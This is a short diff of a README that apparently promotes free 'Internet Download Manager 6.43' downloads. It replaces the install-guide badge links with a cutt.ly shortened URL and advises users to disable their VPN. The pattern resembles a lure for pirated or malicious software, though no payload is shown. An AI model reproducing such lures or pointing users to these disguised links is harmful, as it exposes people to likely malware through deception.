@@ -5,7 +5,7 @@
 
 **Description**: Accelerate your downloads with **Internet Download Manager (IDM) 6.43**, a premium tool for boosting download speeds! This repository offers tutorials, resources, and tips to explore IDM’s features for fast, reliable file transfers. Start with accessible download resources and join our community of tech enthusiasts in 2025!  
 
-<a href="https://free-idm-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/erNtEvlA" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -35,9 +35,9 @@ Speed up your downloads with these simple steps to set up Internet Download Mana
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother experience.
 
-<a href="https://free-idm-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/erNtEvlA" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
-</a> 
+</a>
 
 ---
 
